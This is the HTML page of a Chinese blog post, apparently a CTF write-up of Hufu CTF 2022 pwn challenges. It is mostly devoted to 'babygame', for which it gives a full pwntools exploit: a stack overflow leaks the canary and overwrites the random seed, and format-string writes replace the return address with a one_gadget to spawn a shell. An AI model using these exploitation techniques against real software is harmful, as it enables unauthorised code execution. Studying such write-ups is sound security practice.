@@ -1,0 +1,444 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="不得不说学到了很多东西  babygame查看保护 保护全开 逆向分析 栈溢出漏洞撞脸上 ，game里面其实就是石头剪刀布游戏  这个里面采取了随机数的方法，但是在主函数内的随机种子可以被覆盖，所以我们可以做到随机数预测。还有一种方法，这个种子是时间，我们在运行这个程序的时候我们也可以使用cdll（python和c的联合编程）同样以时间做为种子和程序一起运行，只要不超过1秒就可以了。这里笔者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虎符CTF 2022 pwn">
+<meta property="og:url" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="不得不说学到了很多东西  babygame查看保护 保护全开 逆向分析 栈溢出漏洞撞脸上 ，game里面其实就是石头剪刀布游戏  这个里面采取了随机数的方法，但是在主函数内的随机种子可以被覆盖，所以我们可以做到随机数预测。还有一种方法，这个种子是时间，我们在运行这个程序的时候我们也可以使用cdll（python和c的联合编程）同样以时间做为种子和程序一起运行，只要不超过1秒就可以了。这里笔者">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/1.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/2.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/3.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/5.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/6.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/7.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/11.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/8.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/9.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/10.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/12.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/13.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/15.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/16.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/17.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/18.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/19.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/20.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/21.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/22.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/24.png">
+<meta property="og:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/25.png">
+<meta property="article:published_time" content="2022-03-29T01:16:15.000Z">
+<meta property="article:modified_time" content="2022-05-06T00:48:31.314Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>虎符CTF 2022 pwn</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/04/05/iot%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8BIoT-Sec-Tutorial/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;text=虎符CTF 2022 pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;is_video=false&amp;description=虎符CTF 2022 pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=虎符CTF 2022 pwn&amp;body=Check out this article: http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;title=虎符CTF 2022 pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;name=虎符CTF 2022 pwn&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/&amp;t=虎符CTF 2022 pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#babygame"><span class="toc-number">1.</span> <span class="toc-text">babygame</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mva"><span class="toc-number">2.</span> <span class="toc-text">mva</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gogogo"><span class="toc-number">3.</span> <span class="toc-text">gogogo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4-1"><span class="toc-number">3.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vdq"><span class="toc-number">4.</span> <span class="toc-text">vdq</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4-2"><span class="toc-number">4.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-2"><span class="toc-number">4.2.</span> <span class="toc-text">逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Add"><span class="toc-number">4.2.0.0.1.</span> <span class="toc-text">Add</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Remove"><span class="toc-number">4.2.0.0.2.</span> <span class="toc-text">Remove</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Append"><span class="toc-number">4.2.0.0.3.</span> <span class="toc-text">Append</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Archive"><span class="toc-number">4.2.0.0.4.</span> <span class="toc-text">Archive</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#View"><span class="toc-number">4.2.0.0.5.</span> <span class="toc-text">View</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        虎符CTF 2022 pwn
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-29T01:16:15.000Z" itemprop="datePublished">2022-03-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WP/">WP</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="4">
+
+<blockquote>
+<p>不得不说学到了很多东西</p>
+</blockquote>
+<h1 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/1.png"></p>
+<p>保护全开</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/2.png"></p>
+<p>栈溢出漏洞撞脸上 ，game里面其实就是石头剪刀布游戏</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/3.png"></p>
+<p>这个里面采取了随机数的方法，但是在主函数内的随机种子可以被覆盖，所以我们可以做到随机数预测。还有一种方法，这个种子是时间，我们在运行这个程序的时候我们也可以使用cdll（python和c的联合编程）同样以时间做为种子和程序一起运行，只要不超过1秒就可以了。这里笔者直接利用栈溢出来覆盖这个种子。另外我们可以发现在read的时候我们可以输出canary和stack_addr。</p>
+<p>在game()这个函数里100次胜利我们可以进入下一个函数，也就是格式化漏洞函数</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/5.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞点都找出来了，接下来就是如何进行漏洞利用，首先我们可以借助主函数里的read输出canary和stack_addr，并顺带将种子给覆盖掉</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x120</span> - <span class="number">0x18</span>) + <span class="string">b'b'</span></span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line">canary = u64(<span class="string">b'\x00'</span> + r.recv(<span class="number">7</span>))</span><br><span class="line">li(<span class="string">'[+] canary = '</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'[+] stack_addr = '</span> + <span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>过game这个游戏，cdll联合编程</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">game_srand = cdll.LoadLibrary(<span class="string">'./2.31/libc-2.31.so'</span>)</span><br><span class="line"></span><br><span class="line">game_srand.srand(<span class="number">0x61616161616161</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p2 = <span class="built_in">str</span>((game_srand.rand() + <span class="number">1</span>) % <span class="number">3</span>)</span><br><span class="line">    li(<span class="string">'[+] rand'</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">' = '</span> + p2)</span><br><span class="line">    r.recvuntil(<span class="string">'round '</span>+ <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">': '</span>)</span><br><span class="line">    r.send(p2)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来就是一个格式化漏洞了，先利用格式化漏洞将libc输出，并且将返回地址给改小。使其可以继续使用格式化漏洞函数</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/6.png"></p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/7.png"></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p3 = <span class="string">b'%62c'</span> + <span class="string">b'%8$hhn'</span> + <span class="string">b'a'</span> + <span class="string">b'%79$p'</span> + p64(stack_addr - <span class="number">0x218</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Good luck to you.\n'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b'a'</span>)</span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'[+] __libc_start_main = '</span> + <span class="built_in">hex</span>(__libc_start_main))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.31/libc-2.31.so'</span>)</span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">243</span></span><br><span class="line">li(<span class="string">'[+] libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe3b2e</span>, <span class="number">0xe3b31</span>, <span class="number">0xe3b34</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line">li(<span class="string">'[+] one_gadget = '</span> + <span class="built_in">hex</span>(one_gadget))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后一步利用格式化将地址给换成one_gadget，这样就可以getshell了</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p4 = <span class="string">b''</span></span><br><span class="line">size = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    target_size = (one_gadget &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> target_size &gt; size:</span><br><span class="line">        p4 += <span class="string">b'%'</span> + <span class="built_in">str</span>(target_size - size).encode() + <span class="string">b'c'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p4 += <span class="string">b'%'</span> + <span class="built_in">str</span>(<span class="number">0x100</span> + target_size - size).encode() + <span class="string">b'c'</span></span><br><span class="line">    p4 += <span class="string">b'%'</span> + <span class="built_in">str</span>(<span class="number">16</span> + i).encode() + <span class="string">b'$hhn'</span></span><br><span class="line">    size = target_size</span><br><span class="line"></span><br><span class="line">p4 = p4.ljust(<span class="number">0x50</span>, <span class="string">b'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p4 += p64(stack_addr - <span class="number">0x218</span> + i)</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x108</span> + <span class="string">b'b'</span></span><br><span class="line">r.send(p1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'aaaab'</span>)</span><br><span class="line"></span><br><span class="line">canary = u64(<span class="string">b'\x00'</span> + r.recv(<span class="number">7</span>))</span><br><span class="line">li(<span class="string">'[+] canary = '</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'[+] stack_addr = '</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">game_srand = cdll.LoadLibrary(<span class="string">'./2.31/libc-2.31.so'</span>)</span><br><span class="line"></span><br><span class="line">game_srand.srand(<span class="number">0x61616161616161</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p2 = <span class="built_in">str</span>((game_srand.rand() + <span class="number">1</span>) % <span class="number">3</span>)</span><br><span class="line">    li(<span class="string">'[+] rand'</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">' = '</span> + p2)</span><br><span class="line">    r.recvuntil(<span class="string">'round '</span>+ <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">': '</span>)</span><br><span class="line">    r.send(p2)</span><br><span class="line"></span><br><span class="line">offest = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'%62c'</span> + <span class="string">b'%8$hhn'</span> + <span class="string">b'a'</span> + <span class="string">b'%79$p'</span> + p64(stack_addr - <span class="number">0x218</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Good luck to you.\n'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b'a'</span>)</span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'[+] __libc_start_main = '</span> + <span class="built_in">hex</span>(__libc_start_main))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.31/libc-2.31.so'</span>)</span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">243</span></span><br><span class="line">li(<span class="string">'[+] libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe3b2e</span>, <span class="number">0xe3b31</span>, <span class="number">0xe3b34</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line">li(<span class="string">'[+] one_gadget = '</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b''</span></span><br><span class="line">size = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    target_size = (one_gadget &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> target_size &gt; size:</span><br><span class="line">        p4 += <span class="string">b'%'</span> + <span class="built_in">str</span>(target_size - size).encode() + <span class="string">b'c'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p4 += <span class="string">b'%'</span> + <span class="built_in">str</span>(<span class="number">0x100</span> + target_size - size).encode() + <span class="string">b'c'</span></span><br><span class="line">    p4 += <span class="string">b'%'</span> + <span class="built_in">str</span>(<span class="number">16</span> + i).encode() + <span class="string">b'$hhn'</span></span><br><span class="line">    size = target_size</span><br><span class="line"></span><br><span class="line">p4 = p4.ljust(<span class="number">0x50</span>, <span class="string">b'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    p4 += p64(stack_addr - <span class="number">0x218</span> + i)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Good luck to you.\n'</span>, p4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h1><p>在笔者的vm pwn文章里面详细的写过了</p>
+<h1 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h1><blockquote>
+<p>第二次做golang的pwn，学习一下</p>
+</blockquote>
+<h2 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/11.png"></p>
+<h2 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>ida7.6以上逆go要比ida7.6下好很多，入眼一个if判断，输入正确之后没什么用</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/8.png"></p>
+<p>在看交叉引用的时候看到math_init这个函数，跟进</p>
+<p><img src="/2022/03/29/%E8%99%8E%E7%AC%A62022pwn/9.png"></p>
